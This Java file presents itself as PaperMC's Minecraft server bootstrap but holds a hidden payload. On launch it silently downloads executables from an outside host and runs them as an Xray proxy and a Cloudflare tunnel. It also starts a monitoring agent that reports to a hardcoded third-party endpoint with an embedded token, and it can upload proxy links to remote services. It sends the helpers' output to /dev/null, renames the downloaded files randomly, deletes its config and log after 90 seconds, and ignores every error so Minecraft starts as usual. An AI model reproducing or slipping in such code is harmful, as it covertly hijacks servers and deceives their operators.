package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {

    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");

    // === 环境变量配置 ===
    private static final String FILE_PATH = getEnv("FILE_PATH", "./world");
    private static final String SUB_PATH = getEnv("SUB_PATH", "sub");
    private static final String UUID = getEnv("UUID", "eb6cb84e-4b25-4cd8-bbcf-b78b8c4993e6");

    // Komari 监控配置
    private static final String KOMARI_ENDPOINT = getEnv("KOMARI_ENDPOINT", "https://km.bcbc.pp.ua");
    private static final String KOMARI_TOKEN = getEnv("KOMARI_TOKEN", "QBuqz0sPXRFosAdJJCLjXY");

    // Argo 隧道配置
    private static final String ARGO_DOMAIN = getEnv("ARGO_DOMAIN", "");
    private static final String ARGO_AUTH = getEnv("ARGO_AUTH", "");
    private static final int ARGO_PORT = Integer.parseInt(getEnv("ARGO_PORT", "8001"));

    // 节点配置
    private static final String CFIP = getEnv("CFIP", "cdns.doon.eu.org");
    private static final int CFPORT = Integer.parseInt(getEnv("CFPORT", "443"));
    private static final String NAME = getEnv("NAME", "");

    // 上传配置
    private static final String UPLOAD_URL = getEnv("UPLOAD_URL", "");
    private static final String PROJECT_URL = getEnv("PROJECT_URL", "");
    private static final boolean AUTO_ACCESS = Boolean.parseBoolean(getEnv("AUTO_ACCESS", "false"));

    // 进程管理
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process webProcess;
    private static Process botProcess;
    private static Process komariProcess;

    // 随机文件名
    private static final String webName = generateRandomName();
    private static final String botName = generateRandomName();
    private static final String komariName = generateRandomName();

    private PaperBootstrap() {
    }

    private static String getEnv(String key, String defaultValue) {
        String value = System.getenv(key);
        return (value != null && !value.trim().isEmpty()) ? value.trim() : defaultValue;
    }

    private static String generateRandomName() {
        String chars = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < 6; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        return sb.toString();
    }

    public static void boot(final OptionSet options) {
        // 检查 Java 版本
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            sleep(3000);
            System.exit(1);
        }

        // 初始化代理服务（失败不影响 Minecraft 启动）
        try {
            // 创建运行目录
            Files.createDirectories(Paths.get(FILE_PATH));

            // 清理历史文件
            cleanupOldFiles();

            // 生成配置文件
            generateConfig();

            // 生成隧道配置
            argoType();

            // 下载并运行服务
            downloadFilesAndRun();

            // 提取域名并生成订阅
            extractDomains();

            // 添加自动访问任务
            addVisitTask();

            // 注册关闭钩子
            Runtime.getRuntime().addShutdownHook(new Thread(PaperBootstrap::stopServices));

            // 等待服务启动
            sleep(5000);

            // 90秒后清理文件
            scheduleCleanup();
        } catch (Exception ignored) {
            // 代理服务初始化失败，继续启动 Minecraft
        }

        // 启动 Minecraft 服务器（始终执行）
        SharedConstants.tryDetectVersion();
        getStartupVersionMessages().forEach(LOGGER::info);
        Main.main(options);
    }

    // === 文件清理 ===
    private static void cleanupOldFiles() {
        try {
            Path dir = Paths.get(FILE_PATH);
            if (Files.exists(dir)) {
                Files.list(dir).forEach(path -> {
                    try {
                        Files.deleteIfExists(path);
                    } catch (IOException ignored) {
                    }
                });
            }
        } catch (IOException ignored) {
        }
    }

    // === 生成 Xray 配置 ===
    private static void generateConfig() throws IOException {
        String config = String.format("""
            {
                "log": {"access": "/dev/null", "error": "/dev/null", "loglevel": "none"},
                "inbounds": [
                    {
                        "port": %d,
                        "protocol": "vless",
                        "settings": {
                            "clients": [{"id": "%s"}],
                            "decryption": "none",
                            "fallbacks": [
                                {"dest": 3001},
                                {"path": "/vless-argo", "dest": 3002},
                                {"path": "/vmess-argo", "dest": 3003},
                                {"path": "/trojan-argo", "dest": 3004}
                            ]
                        },
                        "streamSettings": {"network": "tcp"},
                        "sniffing": {"enabled": true, "destOverride": ["http", "tls"]}
                    },
                    {
                        "port": 3001,
                        "listen": "127.0.0.1",
                        "protocol": "vless",
                        "settings": {"clients": [{"id": "%s"}], "decryption": "none"},
                        "streamSettings": {"network": "tcp", "security": "none"}
                    },
                    {
                        "port": 3002,
                        "listen": "127.0.0.1",
                        "protocol": "vless",
                        "settings": {"clients": [{"id": "%s", "level": 0}], "decryption": "none"},
                        "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/vless-argo"}},
                        "sniffing": {"enabled": true, "destOverride": ["http", "tls", "quic"], "metadataOnly": false}
                    },
                    {
                        "port": 3003,
                        "listen": "127.0.0.1",
                        "protocol": "vmess",
                        "settings": {"clients": [{"id": "%s", "alterId": 0}]},
                        "streamSettings": {"network": "ws", "wsSettings": {"path": "/vmess-argo"}},
                        "sniffing": {"enabled": true, "destOverride": ["http", "tls", "quic"], "metadataOnly": false}
                    },
                    {
                        "port": 3004,
                        "listen": "127.0.0.1",
                        "protocol": "trojan",
                        "settings": {"clients": [{"password": "%s"}]},
                        "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/trojan-argo"}},
                        "sniffing": {"enabled": true, "destOverride": ["http", "tls", "quic"], "metadataOnly": false}
                    }
                ],
                "dns": {"servers": ["https+local://8.8.8.8/dns-query"]},
                "outbounds": [
                    {"protocol": "freedom", "tag": "direct"},
                    {"protocol": "blackhole", "tag": "block"}
                ]
            }
            """, ARGO_PORT, UUID, UUID, UUID, UUID, UUID);

        Files.writeString(Paths.get(FILE_PATH, "config.json"), config);
    }

    // === Argo 隧道类型判断 ===
    private static void argoType() throws IOException {
        if (ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) {
            return;
        }

        if (ARGO_AUTH.contains("TunnelSecret")) {
            Files.writeString(Paths.get(FILE_PATH, "tunnel.json"), ARGO_AUTH);

            // 提取 tunnel ID
            Pattern pattern = Pattern.compile("\"TunnelID\"\\s*:\\s*\"([^\"]+)\"");
            Matcher matcher = pattern.matcher(ARGO_AUTH);
            String tunnelId = matcher.find() ? matcher.group(1) : "";

            String tunnelYaml = String.format("""
                tunnel: %s
                credentials-file: %s/tunnel.json
                protocol: http2

                ingress:
                  - hostname: %s
                    service: http://localhost:%d
                    originRequest:
                      noTLSVerify: true
                  - service: http_status:404
                """, tunnelId, FILE_PATH, ARGO_DOMAIN, ARGO_PORT);

            Files.writeString(Paths.get(FILE_PATH, "tunnel.yml"), tunnelYaml);
        }
    }

    // === 下载并运行文件 ===
    private static void downloadFilesAndRun() throws Exception {
        String arch = System.getProperty("os.arch").toLowerCase();
        String archName = (arch.contains("aarch64") || arch.contains("arm64")) ? "arm64" : "amd64";

        Path webPath = Paths.get(FILE_PATH, webName);
        Path botPath = Paths.get(FILE_PATH, botName);
        Path komariPath = Paths.get(FILE_PATH, komariName);

        // 下载 Xray
        downloadFile("https://" + archName + ".ssss.nyc.mn/web", webPath);

        // 下载 Cloudflared
        downloadFile("https://" + archName + ".ssss.nyc.mn/bot", botPath);

        // 下载 Komari Agent (如果配置了)
        if (!KOMARI_ENDPOINT.isEmpty() && !KOMARI_TOKEN.isEmpty()) {
            String komariUrl = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + archName;
            downloadFile(komariUrl, komariPath);
        }

        // 授权文件
        webPath.toFile().setExecutable(true);
        botPath.toFile().setExecutable(true);
        if (Files.exists(komariPath)) {
            komariPath.toFile().setExecutable(true);
        }

        // 运行 Komari Agent
        if (!KOMARI_ENDPOINT.isEmpty() && !KOMARI_TOKEN.isEmpty() && Files.exists(komariPath)) {
            ProcessBuilder pb = new ProcessBuilder(komariPath.toString(), "-e", KOMARI_ENDPOINT, "-t", KOMARI_TOKEN);
            pb.directory(new File(FILE_PATH));
            pb.redirectErrorStream(true);
            pb.redirectOutput(new File("/dev/null"));
            komariProcess = pb.start();
            sleep(1000);
        }

        // 运行 Xray
        ProcessBuilder webPb = new ProcessBuilder(webPath.toString(), "-c", FILE_PATH + "/config.json");
        webPb.redirectErrorStream(true);
        webPb.redirectOutput(new File("/dev/null"));
        webProcess = webPb.start();
        sleep(1000);

        // 运行 Cloudflared
        List<String> botArgs = new ArrayList<>();
        botArgs.add(botPath.toString());
        botArgs.add("tunnel");
        botArgs.add("--edge-ip-version");
        botArgs.add("auto");
        botArgs.add("--no-autoupdate");
        botArgs.add("--protocol");
        botArgs.add("http2");

        if (ARGO_AUTH.matches("[A-Za-z0-9=]{120,250}")) {
            // Token 方式
            botArgs.add("run");
            botArgs.add("--token");
            botArgs.add(ARGO_AUTH);
        } else if (ARGO_AUTH.contains("TunnelSecret")) {
            // JSON 方式
            botArgs.clear();
            botArgs.add(botPath.toString());
            botArgs.add("tunnel");
            botArgs.add("--edge-ip-version");
            botArgs.add("auto");
            botArgs.add("--config");
            botArgs.add(FILE_PATH + "/tunnel.yml");
            botArgs.add("run");
        } else {
            // 临时隧道
            botArgs.add("--logfile");
            botArgs.add(FILE_PATH + "/boot.log");
            botArgs.add("--loglevel");
            botArgs.add("info");
            botArgs.add("--url");
            botArgs.add("http://localhost:" + ARGO_PORT);
        }

        ProcessBuilder botPb = new ProcessBuilder(botArgs);
        botPb.redirectErrorStream(true);
        botPb.redirectOutput(new File("/dev/null"));
        botProcess = botPb.start();
        sleep(3000);
    }

    // === 下载文件 ===
    private static void downloadFile(String urlStr, Path destPath) throws IOException {
        if (Files.exists(destPath) && Files.size(destPath) > 1000000) {
            return;
        }

        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(60000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");

        // 处理重定向
        int status = conn.getResponseCode();
        if (status == HttpURLConnection.HTTP_MOVED_TEMP || status == HttpURLConnection.HTTP_MOVED_PERM) {
            String newUrl = conn.getHeaderField("Location");
            conn = (HttpURLConnection) new URL(newUrl).openConnection();
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        }

        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, destPath, StandardCopyOption.REPLACE_EXISTING);
        }
    }

    // === 提取临时隧道域名 ===
    private static void extractDomains() throws Exception {
        String argoDomain;

        if (!ARGO_AUTH.isEmpty() && !ARGO_DOMAIN.isEmpty()) {
            argoDomain = ARGO_DOMAIN;
        } else {
            // 等待日志生成
            sleep(5000);

            Path bootLog = Paths.get(FILE_PATH, "boot.log");
            if (!Files.exists(bootLog)) {
                sleep(3000);
            }

            String logContent = Files.readString(bootLog);
            Pattern pattern = Pattern.compile("https?://([^\\s]*trycloudflare\\.com)/?");
            Matcher matcher = pattern.matcher(logContent);

            if (matcher.find()) {
                argoDomain = matcher.group(1);
            } else {
                return;
            }
        }

        generateLinks(argoDomain);
    }

    // === 获取 ISP 信息 ===
    private static String getMetaInfo() {
        try {
            URL url = new URL("https://ipapi.co/json/");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }

                String json = response.toString();
                String countryCode = extractJsonValue(json, "country_code");
                String org = extractJsonValue(json, "org");

                if (!countryCode.isEmpty() && !org.isEmpty()) {
                    return countryCode + "_" + org;
                }
            }
        } catch (Exception ignored) {
        }

        // 备用 API
        try {
            URL url = new URL("http://ip-api.com/json/");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(3000);

            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }

                String json = response.toString();
                String countryCode = extractJsonValue(json, "countryCode");
                String org = extractJsonValue(json, "org");

                if (!countryCode.isEmpty() && !org.isEmpty()) {
                    return countryCode + "_" + org;
                }
            }
        } catch (Exception ignored) {
        }

        return "Unknown";
    }

    private static String extractJsonValue(String json, String key) {
        Pattern pattern = Pattern.compile("\"" + key + "\"\\s*:\\s*\"([^\"]+)\"");
        Matcher matcher = pattern.matcher(json);
        return matcher.find() ? matcher.group(1) : "";
    }

    // === 生成订阅链接 ===
    private static void generateLinks(String argoDomain) throws IOException {
        String isp = getMetaInfo();
        String nodeName = NAME.isEmpty() ? isp : NAME + "-" + isp;

        // VMess JSON
        String vmessJson = String.format(
            "{\"v\":\"2\",\"ps\":\"%s\",\"add\":\"%s\",\"port\":\"%d\",\"id\":\"%s\",\"aid\":\"0\",\"scy\":\"none\",\"net\":\"ws\",\"type\":\"none\",\"host\":\"%s\",\"path\":\"/vmess-argo?ed=2560\",\"tls\":\"tls\",\"sni\":\"%s\",\"alpn\":\"\",\"fp\":\"firefox\"}",
            nodeName, CFIP, CFPORT, UUID, argoDomain, argoDomain
        );

        String subTxt = String.format("""
vless://%s@%s:%d?encryption=none&security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Fvless-argo%%3Fed%%3D2560#%s

vmess://%s

trojan://%s@%s:%d?security=tls&sni=%s&fp=firefox&type=ws&host=%s&path=%%2Ftrojan-argo%%3Fed%%3D2560#%s
""",
            UUID, CFIP, CFPORT, argoDomain, argoDomain, nodeName,
            Base64.getEncoder().encodeToString(vmessJson.getBytes()),
            UUID, CFIP, CFPORT, argoDomain, argoDomain, nodeName
        );

        // 保存订阅文件
        String encodedSub = Base64.getEncoder().encodeToString(subTxt.getBytes());
        Files.writeString(Paths.get(FILE_PATH, "sub.txt"), encodedSub);

        // 上传节点
        uploadNodes(subTxt);
    }

    // === 上传节点 ===
    private static void uploadNodes(String subTxt) {
        if (UPLOAD_URL.isEmpty()) return;

        try {
            if (!PROJECT_URL.isEmpty()) {
                // 上传订阅
                String subscriptionUrl = PROJECT_URL + "/" + SUB_PATH;
                String jsonData = "{\"subscription\":[\"" + subscriptionUrl + "\"]}";

                URL url = new URL(UPLOAD_URL + "/api/add-subscriptions");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(jsonData.getBytes());
                }
                conn.getResponseCode();
            } else {
                // 上传节点
                String[] lines = subTxt.split("\n");
                StringBuilder nodes = new StringBuilder("[");
                boolean first = true;
                for (String line : lines) {
                    if (line.matches(".*(vless|vmess|trojan)://.*")) {
                        if (!first) nodes.append(",");
                        nodes.append("\"").append(line.trim()).append("\"");
                        first = false;
                    }
                }
                nodes.append("]");

                String jsonData = "{\"nodes\":" + nodes + "}";

                URL url = new URL(UPLOAD_URL + "/api/add-nodes");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(jsonData.getBytes());
                }
                conn.getResponseCode();
            }
        } catch (Exception ignored) {
        }
    }

    // === 添加自动访问任务 ===
    private static void addVisitTask() {
        if (!AUTO_ACCESS || PROJECT_URL.isEmpty()) {
            return;
        }

        try {
            URL url = new URL("https://oooo.serv00.net/add-url");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            String jsonData = "{\"url\":\"" + PROJECT_URL + "\"}";
            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonData.getBytes());
            }
            conn.getResponseCode();
        } catch (Exception ignored) {
        }
    }

    // === 定时清理文件 ===
    private static void scheduleCleanup() {
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.schedule(() -> {
            try {
                Path configPath = Paths.get(FILE_PATH, "config.json");
                Path bootLogPath = Paths.get(FILE_PATH, "boot.log");
                Path webPath = Paths.get(FILE_PATH, webName);
                Path botPath = Paths.get(FILE_PATH, botName);

                Files.deleteIfExists(configPath);
                Files.deleteIfExists(bootLogPath);
            } catch (IOException ignored) {
            }
        }, 90, TimeUnit.SECONDS);
    }

    // === 停止服务 ===
    private static void stopServices() {
        running.set(false);
        if (webProcess != null && webProcess.isAlive()) {
            webProcess.destroy();
        }
        if (botProcess != null && botProcess.isAlive()) {
            botProcess.destroy();
        }
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
        }
    }

    private static void sleep(long millis) {
        try {
            Thread.sleep(millis);
        } catch (InterruptedException ignored) {
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion, javaVmName, javaVmVersion, javaVendor, javaVendorVersion, osName, osVersion, osArch
            ),
            String.format(
                "Loading %s %s for Minecraft %s",
                bi.brandName(),
                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                bi.minecraftVersionId()
            )
        );
    }
}
